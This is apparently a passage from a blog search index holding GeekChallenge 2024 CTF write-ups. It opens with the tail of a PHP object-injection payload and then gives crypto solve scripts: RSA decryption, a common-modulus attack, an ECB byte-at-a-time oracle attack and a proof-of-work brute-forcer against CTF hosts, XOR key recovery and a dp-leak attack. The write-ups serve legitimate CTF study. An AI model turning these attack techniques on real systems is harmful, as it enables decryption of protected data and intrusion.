class="hljs-meta"><span class="hljs-keyword">$a</span>=new lover;</span><br><span class="hljs-meta"><span class="hljs-keyword">$a</span>-&gt;J1rry=&#x27;Welcome GeekChallenge 2024&#x27;;</span><br><span class="hljs-meta"><span class="hljs-keyword">$a</span>-&gt;meimeng</span><br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a><strong>凯撒加密</strong></h3><p>![屏幕截图 2025-03-01 201210](..&#x2F;images&#x2F;屏幕截图 2025-03-01 201210.png) </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a><strong>RSA</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from Crypto.Util.number import *<br><br>n = 33108009203593648507706487693709965711774665216872550007309537128959455938833<br>p = 192173332221883349384646293941837353967<br>q = 172282016556631997385463935089230918399<br>e = 65537<br>c = 5366332878961364744687912786162467698377615956518615197391990327680664213847<br><br>phi_n = (p - 1) * (q - 1)<br>d = inverse(e, phi_n)<br>m = pow(c, d, n)<br><br>flag_bytes = long_to_bytes(m)<br>flag = flag_bytes.decode(&#x27;utf-8&#x27;)<br>print(flag)<br></code></pre></td></tr></table></figure><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a><strong>共模攻击</strong></h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">from</span> Crypto.Util.number <span class="hljs-meta">import</span> *<br><br>n = <span class="hljs-number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span><br><span class="hljs-symbol">e1</span> = <span class="hljs-number">911</span><br><span class="hljs-symbol">e2</span> = <span class="hljs-number">967</span><br><span class="hljs-symbol">c1</span> = <span class="hljs-number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span><br><span class="hljs-symbol">c2</span> = <span class="hljs-number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span><br><br><span class="hljs-symbol">def</span> extended_gcd(a, b):<br>    <span class="hljs-meta">if</span> a == <span class="hljs-number">0</span>:<br>        return (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><span class="hljs-symbol">    else:</span><br>        g, y, x = extended_gcd(<span class="hljs-keyword">b</span> % a, a)<br>        return (g, x - (<span class="hljs-keyword">b</span> <span class="hljs-comment">// a) * y, y)</span><br><br>g, <span class="hljs-built_in">s1</span>, <span class="hljs-built_in">s2</span> = extended_gcd(e1, e2)<br><br><span class="hljs-symbol">if</span> <span class="hljs-built_in">s1</span> &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">s1</span> = -<span class="hljs-built_in">s1</span><br>    <span class="hljs-built_in">c1</span> = inverse(<span class="hljs-built_in">c1</span>, n)<br><span class="hljs-symbol">if</span> <span class="hljs-built_in">s2</span> &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">s2</span> = -<span class="hljs-built_in">s2</span><br>    <span class="hljs-built_in">c2</span> = inverse(<span class="hljs-built_in">c2</span>, n)<br><br>m = pow(<span class="hljs-built_in">c1</span>, <span class="hljs-built_in">s1</span>, n) * pow(<span class="hljs-built_in">c2</span>, <span class="hljs-built_in">s2</span>, n) % n<br><br><span class="hljs-symbol">flag</span> = long_to_bytes(m)<br><span class="hljs-symbol">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><h3 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a><strong>ECBpad</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>r=remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">37297</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">leng</span>):<br>    pad_len = block - (leng % block) <span class="hljs-keyword">if</span>  leng % block != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;F&#x27;</span> * pad_len<br><br>secret_len = <span class="hljs-number">31</span><br>ori_padding_len = <span class="hljs-number">1</span><br>block = <span class="hljs-number">16</span><br>flag = <span class="hljs-string">b&#x27;&#x27;</span><br><br>padding = [pad(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>padding = padding[<span class="hljs-number">1</span>:]+[padding[<span class="hljs-number">0</span>]]<br><span class="hljs-built_in">print</span>(padding)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(secret_len):<br>    find=<span class="hljs-number">0</span><br>    payload = <span class="hljs-string">b&#x27;*&#x27;</span>*(ori_padding_len+i+<span class="hljs-number">1</span>)<br><br>    group = i//block<br>    r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,payload)<br>    r.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>    data = r.recvline().strip()<br>    <span class="hljs-keyword">if</span> group == <span class="hljs-number">0</span>:<br>        prob=data[-<span class="hljs-number">32</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        prob=(data[-<span class="hljs-number">32</span>*(group+<span class="hljs-number">1</span>):-<span class="hljs-number">32</span>*(group+<span class="hljs-number">1</span>)+<span class="hljs-number">32</span>])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> prob = <span class="hljs-subst">&#123;prob&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> trange(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>        flag_suffix = flag[:<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">15</span>)]<br>        payload = <span class="hljs-built_in">bytes</span>([j]) + flag_suffix + padding[<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(flag_suffix),<span class="hljs-number">15</span>)]<br>        <span class="hljs-comment">#print(j,payload)</span><br>        r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,payload)<br>        r.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>        data = r.recvline().strip()<br>        <span class="hljs-keyword">if</span> data[:<span class="hljs-number">32</span>]==prob:<br>            flag = <span class="hljs-built_in">bytes</span>([j]) + flag<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> flag = <span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>()<br>            find=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> find == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> cannot find!&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="X0R"><a href="#X0R" class="headerlink" title="X0R"></a><strong>X0R</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from Crypto.Util.number import *<br>from pwn import xor<br><br><span class="hljs-comment"># 已知的加密结果</span><br>e2 = 10706859949950921239354880312196039515724907<br>f1 = 4585958212176920650644941909171976689111990<br>f2 = 3062959364761961602614252587049328627114908<br><br><span class="hljs-comment"># 逆向计算 enc</span><br>e1 = e2 ^ f2<br>enc = e1 ^ f1<br><br><span class="hljs-comment"># 将 enc 转换为字节对象</span><br>enc_bytes = long_to_bytes(enc)<br><br><span class="hljs-comment"># 已知 flag 前缀为 SYC&#123;</span><br>prefix = b&#x27;SYC&#123;&#x27;<br><br><span class="hljs-comment"># 计算 key</span><br>key = xor(prefix, enc_bytes[:len(prefix)])<br><br><span class="hljs-comment"># 确保 key 长度为 4</span><br>assert len(key) == 4<br><br><span class="hljs-comment"># 解密 flag</span><br>flag = xor(enc_bytes, key)<br><br><span class="hljs-section">print(&quot;Flag:&quot;, flag.decode())</span><br></code></pre></td></tr></table></figure><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a><strong>dp</strong></h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import long_to_bytes<br><br><span class="hljs-comment"># 已知参数</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br><span class="hljs-attribute">n</span> = <span class="hljs-number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attribute">dp</span> = <span class="hljs-number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span><br><br><span class="hljs-comment"># 恢复p</span><br><span class="hljs-attribute">for</span> k in range(<span class="hljs-number">1</span>, e):<br>    <span class="hljs-attribute">if</span> (dp * e - <span class="hljs-number">1</span>) % k == <span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">hp</span> = (dp * e - <span class="hljs-number">1</span>) // k + <span class="hljs-number">1</span><br>        <span class="hljs-attribute">if</span> n % hp == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">p</span> = hp<br>            <span class="hljs-attribute">q</span> = n // p<br>            <span class="hljs-attribute">break</span><br><br><span class="hljs-comment"># 计算私钥d</span><br><span class="hljs-attribute">phi</span> = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = pow(e, -<span class="hljs-number">1</span>, phi)<br><br><span class="hljs-comment"># 解密得到明文m</span><br><span class="hljs-attribute">m</span> = pow(c, d, n)<br><br><span class="hljs-comment"># 将明文转换为字节串</span><br><span class="hljs-attribute">flag</span> = long_to_bytes(m)<br><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag.decode())<br></code></pre></td></tr></table></figure><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a><strong>nc</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br>io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="hljs-number">19417</span>)<br>l = string.ascii_letters + string.digits<br>con = io.recvuntil(<span class="hljs-string">b&quot;XXXX: &quot;</span>).decode()<br><span class="hljs-comment"># print(con)</span><br><br>p2 = re.findall(<span class="hljs-string">r&#x27;sha256\(XXXX\+(.*)\)&#x27;</span>, con)[<span class="hljs-number">0</span>]<br>ss = re.findall(<span class="hljs-string">r&#x27;== (.*)&#x27;</span>, con)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]<br><span class="hljs-built_in">print</span>(p2)<br><span class="hljs-built_in">print</span>(ss)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> l:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> l:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> l:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> l:<br>                p1 = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span><span class="hljs-subst">&#123;b&#125;</span><span class="hljs-subst">&#123;c&#125;</span><span class="hljs-subst">&#123;d&#125;</span>&#x27;</span><br>                proof = p1 + p2<br>                con = <span class="hljs-string">&#x27;b615cbae&#x27;</span><br>                xxx = hexdigest = sha256(proof.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> xxx[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>] == ss:<br>                    ss = p1<br>                    <span class="hljs-built_in">print</span>(p1)<br>s1 = ss.encode()<br>io.sendline(s1)<br><span class="hljs-comment"># io.sendafter(b&#x27;[-] &#x27;,1)</span><br>re2 = io.recvuntil(<span class="hljs-string">b&#x27;[-] &#x27;</span>).decode()<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">33</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;[-] &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>    re4 = io.recv().decode()<br>    flag += re4.replace(<span class="hljs-string">&#x27;[+] &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;S&#x27;</span> + flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
